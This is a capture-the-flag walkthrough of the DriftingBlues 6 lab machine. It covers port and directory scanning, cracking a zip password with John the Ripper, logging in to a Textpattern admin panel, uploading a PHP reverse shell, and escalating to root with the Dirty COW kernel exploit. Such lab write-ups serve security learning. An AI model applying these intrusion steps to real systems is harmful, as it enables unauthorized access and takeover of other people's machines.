---------------------------------------------------------------------------
NMAP
---------------------------------------------------------------------------
nmap -sS -sV -T4 -p- 10.0.0.24

PORT   STATE SERVICE VERSION                                                                              
80/tcp open  http    Apache httpd 2.2.22 ((Debian)) 

Only port 80 is open, whiche means we can only enumerate HTTP, we cannot get log in via ssh, so we will probably log in to the admin page and start a reverse shell.

Before brute forceing the directories I was searching for usefull comments, and I found this...

<!-- please hack vvmlist.github.io instead
he and their army always hacking us -->

Of course we cannot get any information from this site to prograss in the CTF, bu I checked it out and it has a lot of great vulnareable machines.

root@kali ~/D/C/DriftingBlues#6# dirsearch -u http://10.0.0.24

[11:21:15] 200 -   52KB - /db                                               
[11:21:19] 200 -  750B  - /index.html                                       
[11:21:28] 200 -  110B  - /robots.txt                                       
[11:21:32] 200 -   12KB - /textpattern/

"db" is the image that is displayed. There is a robots.txt file and a directory textpattern. 

robots.txt:

User-agent: *
Disallow: /textpattern/textpattern

dont forget to add .zip extension to your dir-brute
;)

Going to /textpattern, there is a site the is built using textpattern. If we go to http://10.0.0.24/textpattern/textpattern there is a login page.

The robots.txt file stated that there a .zip file in one of the directories.

root@kali ~/D/C/DriftingBlues#6# gobuster dir -u http://10.0.0.24 -w /usr/share/wordlists/dirbuster/directory-list-1.0.txt -x zip

/spammer.zip          (Status: 200) [Size: 179] 

After downloading the zip file and trying to unzip it, it asks for a password. Time for some John The Ripper action.

root@kali ~/D/C/DriftingBlues#6 [80]# zip2john spammer.zip > spammer.txt
root@kali ~/D/C/DriftingBlues#6# john spammer.txt --wordlist=/usr/share/wordlists/rockyou.txt

spammer.zip password ---> myspace4 

The zip file held this credintals:
 
creds.txt:
mayer:lionheart

We can now log in to the admin page. After loggin in we can add a reverse shell file.
After uploading the file we can set up a listener on our local machine and go to 
http://10.0.0.24/textpattern/files/php-reverse-shell.php.

# whoami
www-data

We have access to the machine as the www-data user.

---------------------------------------------------------------------------
PRIVILEGE ESCALATION
---------------------------------------------------------------------------
I tried finding SUID files but found none intersting, there were also no cron tabs.

I found the config.php file in /var/www/textpattern and it held a username and password.

$txpcfg['user'] = 'drifter';
$txpcfg['pass'] = 'imjustdrifting31'

There was no user named "drifter" in the /etc/passwd file so we couldn't switch to that user. I also tried to log in via the admin panel, but with no success.
I searched for ways how to escelate privileges and found that kernel exploits are really common.

# uname -a
Linux driftingblues 3.2.0-4-amd64 #1 SMP Debian 3.2.78-1 x86_64 GNU/Linux

Dirty cow works for this version of the kernel, I uploaded the file from my local machine to the remote machine and executed the exploit, it creates a new user with root privileges.

firefart:user

Before loggin in I had to use the bash shell to switch users.

python2 -c 'import pty; pty.spawn("/bin/bash")'

After giving it a password I could log in as the "firefart" user and read the flag at /root.

░░░░░░▄▄▄▄▀▀▀▀▀▀▀▀▄▄▄▄▄▄▄
░░░░░█░░░░░░░░░░░░░░░░░░▀▀▄
░░░░█░░░░░░░░░░░░░░░░░░░░░░█
░░░█░░░░░░▄██▀▄▄░░░░░▄▄▄░░░░█
░▄▀░▄▄▄░░█▀▀▀▀▄▄█░░░██▄▄█░░░░█
█░░█░▄░▀▄▄▄▀░░░░░░░░█░░░░░░░░░█
█░░█░█▀▄▄░░░░░█▀░░░░▀▄░░▄▀▀▀▄░█
░█░▀▄░█▄░█▀▄▄░▀░▀▀░▄▄▀░░░░█░░█
░░█░░░▀▄▀█▄▄░█▀▀▀▄▄▄▄▀▀█▀██░█
░░░█░░░░██░░▀█▄▄▄█▄▄█▄▄██▄░░█
░░░░█░░░░▀▀▄░█░░░█░█▀█▀█▀██░█
░░░░░▀▄░░░░░▀▀▄▄▄█▄█▄█▄█▄▀░░█
░░░░░░░▀▄▄░░░░░░░░░░░░░░░░░░░█
░░▐▌░█░░░░▀▀▄▄░░░░░░░░░░░░░░░█
░░░█▐▌░░░░░░█░▀▄▄▄▄▄░░░░░░░░█
░░███░░░░░▄▄█░▄▄░██▄▄▄▄▄▄▄▄▀
░▐████░░▄▀█▀█▄▄▄▄▄█▀▄▀▄
░░█░░▌░█░░░▀▄░█▀█░▄▀░░░█
░░█░░▌░█░░█░░█░░░█░░█░░█
░░█░░▀▀░░██░░█░░░█░░█░░█
░░░▀▀▄▄▀▀░█░░░▀▄▀▀▀▀█░░█

congratulations!
